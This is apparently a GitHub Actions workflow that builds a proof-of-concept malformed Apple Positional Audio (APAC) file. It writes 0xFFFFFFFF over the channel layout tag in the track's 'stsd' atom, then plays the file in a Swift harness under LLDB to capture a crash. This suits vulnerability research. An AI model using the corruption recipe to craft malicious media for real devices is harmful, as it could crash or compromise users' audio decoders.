name: Targeted APAC File Corruption and Fuzzing
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-and-test:
    runs-on: macos-latest

    steps:
      # Clone your repository
      - name: Clone Your Repository
        run: git clone https://github.com/encryptedcoderr/AppleTest2/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l

      # Create our Swift player harness
      - name: Create Swift Player Harness
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating Swift audio player harness..."
          cat > harness.swift << 'EOF'
          import Foundation
          import AVFoundation

          class PlayerDelegate: NSObject, AVAudioPlayerDelegate {
              var isPlaying = true
              func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer, successfully flag: Bool) {
                  // Suppress output on success to keep logs clean
                  isPlaying = false
              }
              func audioPlayerDecodeErrorDidOccur(_ player: AVAudioPlayer, error: Error?) {
                  print("Harness Decode Error: \(error?.localizedDescription ?? "unknown error")")
                  isPlaying = false
              }
          }

          if CommandLine.arguments.count < 2 {
              exit(1)
          }

          let filePath = CommandLine.arguments[1]
          let fileURL = URL(fileURLWithPath: filePath)

          do {
              let delegate = PlayerDelegate()
              let audioPlayer = try AVAudioPlayer(contentsOf: fileURL)
              audioPlayer.delegate = delegate
              audioPlayer.play()
              
              while delegate.isPlaying {
                  RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.1))
              }
          } catch {
              print("Harness failed to initialize AVAudioPlayer: \(error.localizedDescription)")
          }
          EOF

      # This script is a simple utility to corrupt a file at a specific offset.
      - name: Create C++ File Corruptor
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating simple C++ file corruption utility..."
          cat > corruptor.cpp << 'EOF'
          #include <stdio.h>
          #include <stdlib.h>

          int main(int argc, const char * argv[]) {
              if (argc != 3) {
                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
                  return 1;
              }

              const char* filePath = argv[1];
              long offset = atol(argv[2]);

              FILE *file = fopen(filePath, "r+b");
              if (!file) {
                  fprintf(stderr, "Corruptor error: Failed to open file: %s\n", filePath);
                  return 1;
              }

              fseek(file, offset, SEEK_SET);
              
              // This is the specific malicious data for the channel layout tag
              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
              fclose(file);
              
              fprintf(stderr, "Corruption complete at offset 0x%lx.\n", offset);
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile the Swift and C++ utilities
      - name: Compile Custom Tools
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling Swift harness..."
          swiftc harness.swift -o harness
          if [ ! -f ./harness ]; then echo "Swift harness compilation failed."; exit 1; fi
          echo "Compiling C++ corruptor..."
          clang++ -g corruptor.cpp -o corruptor
          if [ ! -f ./corruptor ]; then echo "C++ corruptor compilation failed."; exit 1; fi

      # This is the main step that finds the correct offset and corrupts the original file.
      - name: Extract and Surgically Corrupt APAC Track
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          set -x 
          
          echo "Installing Bento4 and jq to find the correct atom offset..."
          brew install bento4 jq
          
          # Use the new video file
          BASE_FILE="IMG_1047.mov"
          POC_FILE="output_apac_poc.mp4"

          # Create a copy to corrupt
          cp "$BASE_FILE" "$POC_FILE"

          # Step 1: Use mp4dump to create a JSON representation of the file structure.
          mp4dump --format json "$POC_FILE" > atom_dump.json
          
          # Step 2: Use a robust jq query to find the 'stsd' atom containing the 'apac' codec definition.
          OFFSET=$(jq -r '.. | objects | select(.name? == "stsd" and any(.children[]; .name? == "apac")) | .file_offset' atom_dump.json)

          if [ -z "$OFFSET" ] || [ "$OFFSET" == "null" ]; then
            echo "Could not find audio 'stsd' offset using jq. Please check atom_dump.json artifact."
            exit 1
          fi
          
          echo "Found APAC 'stsd' atom at offset ${OFFSET}"
          
          # The channel layout tag is at a known position within the stsd atom.
          CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
          
          echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"

          ./corruptor "$POC_FILE" $CORRUPTION_OFFSET
          
          echo "Malicious APAC PoC file generated."
          ls -l "$POC_FILE"
          
      # Launch our custom player under LLDB to catch any crash.
      - name: Launch Player Under LLDB to Catch Crash
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Custom Player with final PoC ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor the harness..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will automatically stop if a crash occurs.
          run
          # If a crash occurred, this will give us the full backtrace.
          bt
          quit
          EOF

          echo "Launching custom Swift harness under LLDB..." >> $PLAYER_LOG_FILE
          lldb -s player_debug_script.lldb -- ./harness output_apac_poc.mp4 >> $PLAYER_LOG_FILE 2>&1 || true

          echo "âœ… Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts for analysis
      - name: Upload All Artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: debug-and-poc-artifacts
          path: |
            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.mp4
            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
            AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
          retention-days: 7
